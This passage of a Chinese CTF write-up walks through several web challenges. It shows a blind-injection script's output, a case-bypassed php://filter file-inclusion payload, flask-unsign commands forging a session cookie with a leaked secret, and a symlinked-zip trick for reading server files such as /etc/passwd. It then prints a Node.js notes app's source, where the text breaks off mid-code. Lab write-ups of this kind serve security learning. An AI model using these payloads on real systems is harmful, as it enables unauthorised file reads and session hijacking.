class="hljs-keyword">if</span> <span class="hljs-string">&quot;非法操作&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag+=j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;用户名或密码错误!&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#adm1n</span><br><span class="hljs-comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f （MD5解密为gtfly123）</span><br></code></pre></td></tr></table></figure><p>他这个<code>XML</code>文档的结构大致是：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">accounts</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>gtfly123<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>e10adc3949ba59abbe56e057f20f883e<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>adm1n<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>cf7414b5bdb2e65ee43083f4ddbc4d9f<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">accounts</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>登录后的页面，URL很可疑(左下角那个base64解码是<code>flag is in /flag</code>)</p><p><img src="/img/ezloginwhat1.png" alt="ezloginwhat1"></p><p>这个URL很容易想到文件包含，直接伪协议读<code>/flag</code>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.BAse64-encode/</span>resource=/flag<br></code></pre></td></tr></table></figure><p>回显<code>nonono</code>。一开始还以为ban了<code>filter</code>或<code>flag</code>这种关键字，想着input执行命令结果还是<code>nonono</code>。后面看了wp说过滤了php🤦‍大写其中某个字母绕过即可：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=pHp:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.BAse64-encode/</span>resource=/flag<br></code></pre></td></tr></table></figure><h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>登录后是个上传界面，没有注入啥的：</p><p><img src="/img/spwuctfwweb31.png" alt="spwuctfwweb31"></p><p>这里点上传会回显<code>permission deied</code>，他这个应该是把身份藏<code>cookie</code>里了，抓包看了感觉像是<code>JWT</code>，试试(这里后面又以admin登录的，还是会提示权限不够)：</p><p><img src="/img/spwuctfwweb32.png" alt="spwuctfwweb32"></p><p>这里估计和这个ID字段有关系，但不知道<code>secretkey</code>没法弄。后面看了<code>wp</code>说这东西在访问不存在的目录时，会出现在请求头当中：</p><p><img src="/img/spwuctfwweb33.png" alt="spwuctfwweb33"></p><blockquote><p>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</p></blockquote><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">flask-unsign</span> <span class="hljs-built_in">--unsign</span> <span class="hljs-built_in">--decode</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiYWFhIiwidXNlcm5hbWUiOiJhYWEifQ.Zd0_yQ.qchBTpcAF1Zy3aeWFbnOsK8xLZg&quot;</span> <span class="hljs-built_in">--secret</span> <span class="hljs-string">&#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span> <span class="hljs-built_in">--no-literal-eval</span><br><br><span class="hljs-string">flask-unsign</span> <span class="hljs-built_in">--sign</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;&#123;&#x27;id&#x27;: b&#x27;1&#x27;, &#x27;is_login&#x27;: True, &#x27;password&#x27;: &#x27;aaa&#x27;, &#x27;username&#x27;: &#x27;aaa&#x27;&#125;</span><br><span class="hljs-string">&quot;</span> <span class="hljs-built_in">--secret</span> <span class="hljs-string">&#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span> <span class="hljs-built_in">--no-literal-eval</span><br></code></pre></td></tr></table></figure><p>登录完发现是给了源码的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template_string(temp)<br>    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:<br>        m = hashlib.md5()<br>        name = session[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        name = name+<span class="hljs-string">&#x27;qweqweqwe&#x27;</span><br>        name = name.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        m.update(name)<br>        md5_one= m.hexdigest()<br>        n = hashlib.md5()<br>        ip = request.remote_addr<br>        ip = ip.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        n.update(ip)<br>        md5_ip = n.hexdigest()<br>        f=request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        basepath=os.path.dirname(os.path.realpath(__file__))<br>        path = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>+md5_one+<span class="hljs-string">&#x27;/&#x27;</span>+session[<span class="hljs-string">&#x27;username&#x27;</span>]+<span class="hljs-string">&quot;/&quot;</span><br>        path_base = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span><br>        filename = f.filename<br>        pathname = path+filename<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> != filename.split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zip only allowed&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path_base):<br>            <span class="hljs-keyword">try</span>:<br>                os.makedirs(path_base)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):<br>            <span class="hljs-keyword">try</span>:<br>                os.makedirs(path)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(pathname):<br>            <span class="hljs-keyword">try</span>:<br>                f.save(pathname)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            cmd = <span class="hljs-string">&quot;unzip -n -d &quot;</span>+path+<span class="hljs-string">&quot; &quot;</span>+ pathname<br>            <span class="hljs-keyword">if</span> cmd.find(<span class="hljs-string">&#x27;|&#x27;</span>) != -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> cmd.find(<span class="hljs-string">&#x27;;&#x27;</span>) != -<span class="hljs-number">1</span>: <span class="hljs-comment">#这里限制了不能利用system同时执行多条命令</span><br>waf()<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>            os.system(cmd)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        unzip_file = zipfile.ZipFile(pathname,<span class="hljs-string">&#x27;r&#x27;</span>)<br>        unzip_filename = unzip_file.namelist()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;is_login&#x27;</span>] != <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not login&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> unzip_filename.find(<span class="hljs-string">&#x27;/&#x27;</span>) != -<span class="hljs-number">1</span>:<br>                shutil.rmtree(path_base)<br>                os.mkdir(path_base)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>            image = <span class="hljs-built_in">open</span>(path+unzip_filename, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>            resp = make_response(image)<br>            resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span><br>            <span class="hljs-keyword">return</span> resp<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            shutil.rmtree(path_base)<br>            os.mkdir(path_base)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/showflag&#x27;</span></span>)  </span><span class="hljs-comment">#这个路由就是告诉了flag在哪</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">showflag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == <span class="hljs-literal">False</span>:<br>        image = <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="hljs-string">&quot;rb&quot;</span>).read() <span class="hljs-comment">#proc/self/cwd代替当前目录</span><br>        resp = make_response(image)<br>        resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span><br>        <span class="hljs-keyword">return</span> resp<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span><br></code></pre></td></tr></table></figure><p>利用点就是<code>/upload</code>路由的后半部分：先把上传的压缩包解压了然后去读取解压后的图片内容：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -s是Linux的一种软连接,类似与windows的快捷方式<br>ln -s <span class="hljs-regexp">/etc/</span>passwd forever404 这会出现一个forever404文本,里面包含密码<br><span class="hljs-regexp">/proc/</span>self 记录了系统运行的信息状态等,cwd 指向当前进程运行目录的一个符号链接,即flask运行进程目录<br><br>ln -s <span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span>flag/flag.jpg test<br>zip -ry test.zip test<br>-r：表示递归地包含指定目录下的所有文件和子目录。<br>-y：表示将符号链接（symbolic links）作为符号链接保存，而不解引用它们。这通常用于在 ZIP 文件中保留符号链接的原始状态<br></code></pre></td></tr></table></figure><h2 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h2><p>给了源码，实现记笔记的功能。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; exec &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Notes</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">owner</span> = <span class="hljs-string">&quot;whoknows&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span> = &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">write_note</span>(<span class="hljs-params">author, raw_note</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[(<span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>++).<span class="hljs-title function_">toString</span>()] = &#123;<span class="hljs-string">&quot;author&quot;</span>: author,<span class="hljs-string">&quot;raw_note&quot;</span>:raw_note&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">get_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">var</span> r = &#123;&#125;<br>        <span class="hljs-title function_">undefsafe</span>(r, id, <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id));<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123;<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br><br>    <span class="hljs-title function_">get_all_notes</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>;<br>    &#125;<br><br>    <span class="hljs-title function_">remove_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[id];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> notes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notes</span>();<br>notes.<span class="hljs-title function_">write_note</span>(<span class="hljs-string">&quot;nobody&quot;</span>, <span class="hljs-string">&quot;this is nobody&#x27;s first note&quot;</span>);<br><br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Notebook&#x27;</span> &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/add_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;please use POST to add a note&#x27;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> raw = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (author &amp;&amp; raw) &#123;<br>            notes.<span class="hljs-title function_">write_note</span>(author, raw);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;add note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;did not add note&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/delete_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to delete a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">if</span> (id) &#123;<br>            notes.<span class="hljs-title function_">remove_note</span>(id);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete done&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/notes&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>        <span class="hljs-keyword">let</span> a_note;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;<br>            a_note = notes.<span class="hljs-title function_">get_all_notes</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a_note = notes.<span class="hljs-title function_">get_note</span>(q);<br>        &#125;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            <span class="hljs-title function_">exec</span>(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.<span class="hljs-title function_">end</span>();<br>    &#125;)<br><span class="hljs-comment">//注意这里的for..in：循环将遍历对象本身的所有可枚举属性，以及对象从其构造函数原型中继承的属性</span><br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span 